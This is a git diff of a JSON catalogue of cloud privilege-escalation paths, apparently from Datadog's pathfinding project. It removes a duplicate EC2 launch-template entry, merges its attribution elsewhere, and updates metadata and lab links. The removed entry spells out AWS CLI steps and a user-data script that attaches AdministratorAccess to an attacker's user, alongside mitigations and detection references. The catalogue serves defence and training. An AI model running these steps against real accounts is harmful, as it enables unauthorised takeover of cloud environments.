@@ -8116,7 +8116,7 @@
       "pathfinding-labs": {
         "type": "open-source",
         "githubLink": "https://github.com/DataDog/pathfinding-labs",
-        "scenario": "privesc-one-hop/to-admin/iam-passrole+ec2-requestspotinstances",
+        "scenario": "privesc-one-hop/to-admin/ec2-003-iam-passrole+ec2-requestspotinstances",
         "description": "Deploy Terraform into your own AWS account to practice this attack path"
       },
       "cloudgoat": {
@@ -8227,7 +8227,7 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-10-09T14:39:51Z",
+      "lastUpdated": "2026-11-13T13:56:35Z",
       "contributors": [
         {
           "name": "Seth Art",
@@ -8242,317 +8242,6 @@
       ]
     },
     "filePath": "data/paths/aws/ec2/ec2-003.yaml",
-    "cloud": "aws"
-  },
-  {
-    "id": "ec2-004",
-    "name": "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate",
-    "category": "existing-passrole",
-    "services": [
-      "ec2",
-      "iam"
-    ],
-    "detectionTools": {
-      "prowler": "https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L92",
-      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L169"
-    },
-    "permissions": {
-      "required": [
-        {
-          "permission": "ec2:CreateLaunchTemplateVersion",
-          "resourceConstraints": "Must be able to create new versions of existing launch templates"
-        },
-        {
-          "permission": "ec2:ModifyLaunchTemplate",
-          "resourceConstraints": "Must be able to modify launch template default version"
-        }
-      ],
-      "additional": [
-        {
-          "permission": "ec2:DescribeLaunchTemplates",
-          "resourceConstraints": "Helpful for discovering existing launch templates to target"
-        },
-        {
-          "permission": "ec2:DescribeLaunchTemplateVersions",
-          "resourceConstraints": "Useful for viewing existing template configuration including instance profiles"
-        },
-        {
-          "permission": "iam:ListRoles",
-          "resourceConstraints": "Helpful for discovering privileged roles already configured in templates"
-        },
-        {
-          "permission": "iam:ListInstanceProfiles",
-          "resourceConstraints": "Useful for identifying instance profiles with privileged roles"
-        },
-        {
-          "permission": "autoscaling:DescribeAutoScalingGroups",
-          "resourceConstraints": "Helpful for identifying which ASGs use the target launch template"
-        },
-        {
-          "permission": "ec2:DescribeInstances",
-          "resourceConstraints": "Useful for monitoring instance launches and verifying user data execution"
-        },
-        {
-          "permission": "autoscaling:SetDesiredCapacity",
-          "resourceConstraints": "Helpful for triggering instance launches via Auto Scaling Groups"
-        }
-      ]
-    },
-    "description": "A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next EC2 instance launches from the template (via Auto Scaling Groups, scheduled tasks, or manual launches), it automatically receives the privileged role and executes the malicious user data script, which can grant the attacker persistent administrative access. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction. EC2 launch templates are commonly used with Auto Scaling Groups to define instance configuration including AMI, instance type, security groups, IAM instance profile, and user data scripts.",
-    "prerequisites": {
-      "admin": [
-        "A launch template must exist that references an IAM role with administrative permissions in a previous version",
-        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches",
-        "The attacker must be able to trigger or wait for an instance launch from the modified template"
-      ],
-      "lateral": [
-        "A launch template must exist that references an IAM role with some elevated permissions",
-        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
-      ]
-    },
-    "exploitationSteps": {
-      "awscli": [
-        {
-          "step": 1,
-          "command": "# Discover existing launch templates\naws ec2 describe-launch-templates \\\n  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \\\n  --output table\n",
-          "description": "Enumerate existing launch templates to identify targets for modification."
-        },
-        {
-          "step": 2,
-          "command": "# Get template details including instance profile\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --versions '$Default' \\\n  --query 'LaunchTemplateVersions[0].LaunchTemplateData'\n",
-          "description": "Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. Look for templates with admin or elevated instance profiles. Replace lt-xxxxxxxxxxxxx with actual template ID."
-        },
-        {
-          "step": 3,
-          "command": "# Prepare malicious user data script\ncat > user-data.sh <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n\n# Base64 encode the user data\nUSER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\\n')\n",
-          "description": "Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
-        },
-        {
-          "step": 4,
-          "command": "# Create a new launch template version with malicious user data\n# Keep the same instance profile from the existing version (no PassRole needed)\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --source-version 1 \\\n  --launch-template-data \"{\n    \\\"IamInstanceProfile\\\": {\n      \\\"Name\\\": \\\"EXISTING_PRIVILEGED_INSTANCE_PROFILE\\\"\n    },\n    \\\"UserData\\\": \\\"$USER_DATA_B64\\\"\n  }\"\n",
-          "description": "Create a new launch template version that references the existing privileged instance profile and includes the malicious user data. Replace lt-xxxxxxxxxxxxx with the target template ID and EXISTING_PRIVILEGED_INSTANCE_PROFILE with the instance profile name found in step 2. Note that this does NOT require iam:PassRole since you're referencing an existing role configuration."
-        },
-        {
-          "step": 5,
-          "command": "# Set the new version as the default\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --default-version NEW_VERSION_NUMBER\n",
-          "description": "Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version number from step 4. All future instance launches will now use this malicious configuration."
-        },
-        {
-          "step": 6,
-          "command": "# Trigger instance launch (if template is used by an ASG)\naws autoscaling set-desired-capacity \\\n  --auto-scaling-group-name TARGET_ASG_NAME \\\n  --desired-capacity 1\n",
-          "description": "Trigger an instance launch. If the template is used by an Auto Scaling Group, you can increase the desired capacity. Alternatively, wait for auto-scaling events or scheduled instance launches to trigger automatically."
-        },
-        {
-          "step": 7,
-          "command": "# Wait 2-3 minutes, then verify AdministratorAccess was attached\naws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE\n",
-          "description": "Wait for the instance to launch and execute the user data script (typically 2-3 minutes), then verify that AdministratorAccess has been attached to your starting principal."
-        },
-        {
-          "step": 8,
-          "command": "# Verify administrator access\naws iam list-users\n",
-          "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
-        }
-      ],
-      "pathrunner": [
-        {
-          "step": 1,
-          "command": "pathrunner use ec2-004",
-          "description": "Load the ec2-004 exploit module in Pathrunner."
-        },
-        {
-          "step": 2,
-          "command": "pathrunner show payloads",
-          "description": "List the payloads compatible with this module."
-        },
-        {
-          "step": 3,
-          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
-          "description": "Select the backdoor/attach-policy payload."
-        },
-        {
-          "step": 4,
-          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
-          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
-        },
-        {
-          "step": 5,
-          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
-          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
-        },
-        {
-          "step": 6,
-          "command": "pathrunner exploit",
-          "description": "Execute the privilege escalation."
-        }
-      ]
-    },
-    "limitations": "This path provides administrative access only if the target launch template already references a role with administrative permissions. If the existing template only references roles with limited permissions, the attacker gains access limited to those permissions.\n\nImportantly, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing an IAM role that already exists in a previous template version. This makes it harder to detect than traditional PassRole-based attacks.\n",
-    "recommendation": "Restrict `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions using resource-based policies to limit which templates can be modified:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"ec2:CreateLaunchTemplateVersion\",\n    \"ec2:ModifyLaunchTemplate\"\n  ],\n  \"Resource\": \"arn:aws:ec2:*:ACCOUNT:launch-template/specific-template-id\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:ResourceTag/Environment\": \"dev\"\n    }\n  }\n}\n\nUse Service Control Policies (SCPs) to prevent launch template modifications in production environments unless from approved automation roles.\n\nMonitor CloudTrail for `CreateLaunchTemplateVersion` and `ModifyLaunchTemplate` API calls, especially on templates that reference privileged instance profiles. Alert when default versions are changed.\n\nPin Auto Scaling Groups to specific launch template versions (e.g., `$Latest` or version number) rather than using `$Default`, preventing automatic use of modified default versions.\n\nMonitor EC2 user data for suspicious IAM-related commands using AWS Config rules or custom Lambda functions that inspect new template versions.\n\nRegularly audit existing launch templates to identify those with privileged instance profiles and restrict modification permissions to only necessary principals.\n\nImplement approval workflows for launch template changes using AWS Service Catalog or custom automation with human approval steps.\n\nEnable MFA requirements for sensitive operations like launch template modifications using `aws:MultiFactorAuthPresent` condition keys.\n\nUse IAM Access Analyzer to identify principals with template modification permissions on templates containing privileged roles.\n\nConsider using EC2 Image Builder with locked-down instance profiles instead of relying on user data for configuration.\n",
-    "discoveryAttribution": {
-      "firstDocumented": {
-        "source": "HackTricks",
-        "link": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate"
-      },
-      "derivativeOf": {
-        "pathId": "ec2-001",
-        "modification": "Uses ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate to modify existing templates without requiring iam:PassRole"
-      },
-      "ultimateOrigin": {
-        "pathId": "ec2-001",
-        "author": "Spencer Gietzen",
-        "organization": "Rhino Security Labs",
-        "date": 2018,
-        "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
-      }
-    },
-    "references": [
-      {
-        "title": "AWS EC2 Launch Templates Documentation",
-        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html"
-      },
-      {
-        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
-        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
-      },
-      {
-        "title": "HackTricks - AWS - EC2 Privesc",
-        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate"
-      }
-    ],
-    "relatedPaths": [
-      "ec2-001",
-      "ec2-002",
-      "ec2-003"
-    ],
-    "learningEnvironments": {
-      "pathfinding-labs": {
-        "type": "open-source",
-        "githubLink": "https://github.com/DataDog/pathfinding-labs",
-        "scenario": "privesc-one-hop/to-admin/ec2-createlaunchtemplateversion+ec2-modifylaunchtemplate",
-        "description": "Deploy Terraform into your own AWS account to practice this attack path"
-      }
-    },
-    "attackVisualization": {
-      "nodes": [
-        {
-          "id": "start",
-          "label": "Starting Principal",
-          "type": "principal",
-          "description": "The principal with ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate permissions. Can be an IAM user or role with access to modify existing launch templates.\n"
-        },
-        {
-          "id": "existing_template",
-          "label": "Existing Launch Template",
-          "type": "resource",
-          "description": "An existing EC2 launch template that already references a privileged IAM instance profile in a previous version. The attacker discovers this template through ec2:DescribeLaunchTemplates and identifies the privileged role configuration to exploit. Crucially, modifying this template does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.\n"
-        },
-        {
-          "id": "modified_template",
-          "label": "Modified Launch Template",
-          "type": "resource",
-          "description": "The attacker creates a new template version with malicious user data (using ec2:CreateLaunchTemplateVersion) and sets it as the default (using ec2:ModifyLaunchTemplate). The new version keeps the same privileged IAM instance profile from the existing version but injects malicious user data. All future instance launches from this template will now use the malicious configuration.\n"
-        },
-        {
-          "id": "new_instance",
-          "label": "New EC2 Instance",
-          "type": "resource",
-          "description": "An EC2 instance launches from the modified template. This could happen through Auto Scaling Groups, scheduled tasks, or manual launches by other users. The instance automatically receives the privileged IAM role and executes the malicious user data script. The attacker may need to trigger the launch (if they have autoscaling:SetDesiredCapacity) or wait for auto-scaling events or scheduled launches to occur naturally.\n"
-        },
-        {
-          "id": "target_role",
-          "label": "Existing Role That Trusts the EC2 Service",
-          "type": "principal",
-          "description": "IAM role that was already configured in the original launch template. The newly launched instance automatically assumes this role through its instance profile. The role's temporary credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The malicious user data script executes with these credentials and attempts to attach AdministratorAccess to the starting principal.\n"
-        },
-        {
-          "id": "admin",
-          "label": "Effective Administrator",
-          "type": "outcome",
-          "description": "If the existing role has IAM write permissions (specifically iam:AttachUserPolicy or AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has persistent full administrative access to the AWS account.\n"
-        },
-        {
-          "id": "some_perms",
-          "label": "Limited Escalation Possible",
-          "type": "outcome",
-          "color": "#ffeb99",
-          "description": "If the existing role has some elevated permissions but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the attacker may still benefit from the instance remaining in a modified state that could be exploited later, potential access to resources the role can reach (S3, DynamoDB, Secrets Manager), or the ability to exfiltrate credentials or data through the instance.\n"
-        },
-        {
-          "id": "no_access",
-          "label": "No Effective Escalation",
-          "type": "outcome",
-          "color": "#cccccc",
-          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails to attach any policies and there are no useful resources to access. No effective privilege escalation occurs, though the template remains modified with the malicious configuration.\n"
-        }
-      ],
-      "edges": [
-        {
-          "from": "start",
-          "to": "existing_template",
-          "label": "Identifies existing template",
-          "description": "The starting principal identifies an existing launch template that already references a privileged IAM instance profile. This reconnaissance can be done using ec2:DescribeLaunchTemplates and ec2:DescribeLaunchTemplateVersions (from permissions.additional), but these permissions are not required for the attack itself - the attacker may already know which template to target through other means (documentation, previous access, etc.).\n\nOptional reconnaissance commands:\n```bash\naws ec2 describe-launch-templates \\\n  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \\\n  --output table\n\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --versions '$Default' \\\n  --query 'LaunchTemplateVersions[0].LaunchTemplateData'\n```\n"
-        },
-        {
-          "from": "existing_template",
-          "to": "modified_template",
-          "label": "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate",
-          "description": "The starting principal creates a new launch template version that references the existing privileged instance profile and includes malicious user data, then modifies the template to set this version as the new default. This does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.\n\nCommands:\n```bash\n# Create new version with malicious user data\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --source-version 1 \\\n  --launch-template-data '{\n    \"IamInstanceProfile\": {\n      \"Name\": \"EXISTING_PRIVILEGED_INSTANCE_PROFILE\"\n    },\n    \"UserData\": \"BASE64_ENCODED_MALICIOUS_SCRIPT\"\n  }'\n\n# Set new version as default\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --default-version NEW_VERSION_NUMBER\n```\n\nThe malicious user data script attempts to attach AdministratorAccess to the starting principal using the target role's credentials.\n"
-        },
-        {
-          "from": "modified_template",
-          "to": "new_instance",
-          "label": "Instance launch triggered",
-          "description": "An EC2 instance launches from the modified template. This could be triggered by the attacker (if they have ASG permissions), by auto-scaling events, by scheduled tasks, or by other users manually launching instances.\n\nCommand (if attacker has autoscaling:SetDesiredCapacity):\n```bash\naws autoscaling set-desired-capacity \\\n  --auto-scaling-group-name TARGET_ASG_NAME \\\n  --desired-capacity 1\n```\n\nAlternatively, the attacker may need to wait for these events to occur naturally through normal auto-scaling operations or scheduled instance launches.\n"
-        },
-        {
-          "from": "new_instance",
-          "to": "target_role",
-          "label": "Instance assumes role",
-          "description": "The launched instance automatically assumes the privileged IAM role through its instance profile. The EC2 service provides temporary credentials via the instance metadata service. The malicious user data script executes automatically during instance initialization (typically within 1-2 minutes of launch), running with the target role's credentials.\n"
-        },
-        {
-          "from": "target_role",
-          "to": "admin",
-          "label": "If role has IAM write permissions",
-          "branch": "A",
-          "condition": "admin",
-          "description": "If the target role has iam:AttachUserPolicy or equivalent IAM write permissions (such as AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal, granting persistent full administrative access.\n\nExample user data script that executes:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
-        },
-        {
-          "from": "target_role",
-          "to": "some_perms",
-          "label": "If role has elevated permissions but not IAM write",
-          "branch": "B",
-          "condition": "some_permissions",
-          "description": "If the target role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the modified template persists and could be exploited in other ways, or the instance could be used as a pivot point to access data or services within the role's permissions.\n"
-        },
-        {
-          "from": "target_role",
-          "to": "no_access",
-          "label": "If role has minimal permissions",
-          "branch": "C",
-          "condition": "no_permissions",
-          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails and there are no useful resources to access. The template remains modified but provides no effective privilege escalation.\n"
-        }
-      ]
-    },
-    "gitMetadata": {
-      "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-10-09T14:39:51Z",
-      "contributors": [
-        {
-          "name": "Seth Art",
-          "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
-        },
-        {
-          "name": "Vicky Barth",
-          "email": "vicky.barth@datadoghq.com",
-          "githubUsername": "vbarth2"
-        }
-      ]
-    },
-    "filePath": "data/paths/aws/ec2/ec2-004.yaml",
     "cloud": "aws"
   },
   {
@@ -8586,6 +8275,14 @@
         {
           "permission": "ec2:RunInstances",
           "resourceConstraints": "Can be used to trigger a new instance from the modified template; alternatively an existing Auto Scaling Group or EC2 Fleet that references the template will launch instances on the next scale-out event"
+        },
+        {
+          "permission": "autoscaling:DescribeAutoScalingGroups",
+          "resourceConstraints": "Helpful for identifying which Auto Scaling Groups use the target launch template"
+        },
+        {
+          "permission": "autoscaling:SetDesiredCapacity",
+          "resourceConstraints": "Can be used to force a scale-out on an Auto Scaling Group that references the template, triggering an instance launch without `ec2:RunInstances`"
         },
         {
           "permission": "iam:ListAttachedUserPolicies",
@@ -8676,16 +8373,34 @@
         }
       ]
     },
-    "recommendation": "- **Audit launch templates for privileged instance profiles** - Any launch template with an admin or high-privilege instance profile is a persistent escalation vector for any principal with `ec2:CreateLaunchTemplateVersion`. Regularly review and down-scope instance profiles referenced in launch templates.\n- **Restrict `ec2:CreateLaunchTemplateVersion`** - This permission allows creating new template versions with arbitrary user-data and instance configurations. Only trusted principals (e.g., infrastructure automation) should have this permission. Use IAM conditions to restrict which launch templates can be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"ec2:CreateLaunchTemplateVersion\",\n  \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:launch-template/lt-SPECIFIC_TEMPLATE_ID\"\n}\n```\n\n- **Restrict `ec2:ModifyLaunchTemplate`** - Setting a new default version activates the malicious user-data for all future instances. Restrict this permission to the same trusted CI/CD principals that manage template versions.\n- **Apply instance metadata service (IMDSv2) controls** - Require IMDSv2 on all EC2 instances to limit the blast radius of credential access via IMDS, even if an attacker gains code execution via user-data.\n- Monitor CloudTrail for `ec2:CreateLaunchTemplateVersion` calls followed closely by `ec2:ModifyLaunchTemplate`, especially from principals who don't normally manage launch templates\n- Monitor CloudTrail for launch template version changes that modify the `UserData` field\n- Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) where the source is an EC2 instance role\n- Regularly audit all EC2 launch templates and Auto Scaling Groups for privileged instance profiles\n",
+    "recommendation": "- **Audit launch templates for privileged instance profiles** - Any launch template with an admin or high-privilege instance profile is a persistent escalation vector for any principal with `ec2:CreateLaunchTemplateVersion`. Regularly review and down-scope instance profiles referenced in launch templates.\n- **Restrict `ec2:CreateLaunchTemplateVersion`** - This permission allows creating new template versions with arbitrary user-data and instance configurations. Only trusted principals (e.g., infrastructure automation) should have this permission. Use IAM conditions to restrict which launch templates can be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"ec2:CreateLaunchTemplateVersion\",\n  \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:launch-template/lt-SPECIFIC_TEMPLATE_ID\"\n}\n```\n\n- **Restrict `ec2:ModifyLaunchTemplate`** - Setting a new default version activates the malicious user-data for all future instances. Restrict this permission to the same trusted CI/CD principals that manage template versions.\n- **Pin Auto Scaling Groups to a specific launch template version number** - An ASG configured with `$Default` (or `$Latest`) automatically picks up a malicious new version. Pinning to an explicit version number means a new default version has no effect until the ASG itself is updated.\n- **Apply instance metadata service (IMDSv2) controls** - Require IMDSv2 on all EC2 instances to limit the blast radius of credential access via IMDS, even if an attacker gains code execution via user-data.\n- Monitor CloudTrail for `ec2:CreateLaunchTemplateVersion` calls followed closely by `ec2:ModifyLaunchTemplate`, especially from principals who don't normally manage launch templates\n- Monitor CloudTrail for launch template version changes that modify the `UserData` field\n- Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) where the source is an EC2 instance role\n- Regularly audit all EC2 launch templates and Auto Scaling Groups for privileged instance profiles\n",
     "limitations": "This path requires that an existing launch template already has an admin or elevated instance profile attached. The attacker does not need `iam:PassRole` because the instance profile was previously assigned \u2014 `ec2:CreateLaunchTemplateVersion` inherits it via `--source-version`. The escalation also depends on a trigger to actually launch an instance from the modified template. If no Auto Scaling Group or Fleet references the template, the attacker may need `ec2:RunInstances` to trigger the launch.\n",
     "discoveryAttribution": {
       "firstDocumented": {
-        "author": "Seth Art",
-        "organization": "Datadog",
-        "date": "2025"
+        "source": "HackTricks",
+        "link": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate"
+      },
+      "derivativeOf": {
+        "pathId": "ec2-001",
+        "modification": "Uses ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate to modify existing templates without requiring iam:PassRole"
+      },
+      "ultimateOrigin": {
+        "pathId": "ec2-001",
+        "author": "Spencer Gietzen",
+        "organization": "Rhino Security Labs",
+        "date": 2018,
+        "link": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
       }
     },
     "references": [
+      {
+        "title": "HackTricks - AWS - EC2 Privesc",
+        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate"
+      },
+      {
+        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
       {
         "title": "IAM permissions required for Amazon EC2 launch templates (AWS Documentation)",
         "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/permissions-for-launch-templates.html"
@@ -8700,13 +8415,13 @@
       }
     ],
     "relatedPaths": [
+      "ec2-001",
       "ec2-002",
-      "ec2-003",
-      "ec2-004"
+      "ec2-003"
     ],
     "detectionTools": {
-      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L275",
-      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L154"
+      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L169",
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L92"
     },
     "learningEnvironments": {
       "pathfinding-labs": {
@@ -8823,7 +8538,7 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-10-09T14:39:51Z",
+      "lastUpdated": "2026-11-13T13:56:35Z",
       "contributors": [
         {
           "name": "Seth Art",
@@ -8939,7 +8654,7 @@
       "pathfinding-labs": {
         "type": "open-source",
         "githubLink": "https://github.com/DataDog/pathfinding-labs",
-        "scenario": "privesc-one-hop/to-admin/ec2-instance-connect-sendsshpublickey",
+        "scenario": "privesc-one-hop/to-admin/ec2instanceconnect-003-ec2-instance-connect-sendsshpublickey",
         "description": "Deploy Terraform into your own AWS account to practice this attack path"
       },
       "iam-vulnerable": {
@@ -9056,8 +8771,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-11-13T13:56:35Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -13713,7 +13433,7 @@
         "type": "open-source",
         "githubLink": "https://github.com/DataDog/pathfinding-labs",
         "scenario": "modules/scenarios/gcp/single-account/privesc-one-hop/to-admin/gcp-iam-001-iam-serviceaccountsgetaccesstoken",
-        "description": "Deploy Terraform into your own GCP project to practice this attack path: a service account holding `iam.serviceAccounts.getAccessToken` on a second, privileged service account impersonates it to inherit its project-level `roles/editor` and Secret Manager access."
+        "description": "Deploy Terraform into your own GCP project to practice this attack path: a service account holding `iam.serviceAccounts.getAccessToken` on a second, privileged service account impersonates it to inherit its project-level `roles/owner` access."
       },
       "gcpgoat": {
         "type": "open-source",
@@ -13793,7 +13513,7 @@
     },
     "gitMetadata": {
       "created": "2026-10-08T11:30:45Z",
-      "lastUpdated": "2026-11-12T19:26:08Z",
+      "lastUpdated": "2026-11-13T14:00:51Z",
       "contributors": [
         {
           "name": "Seth Art",
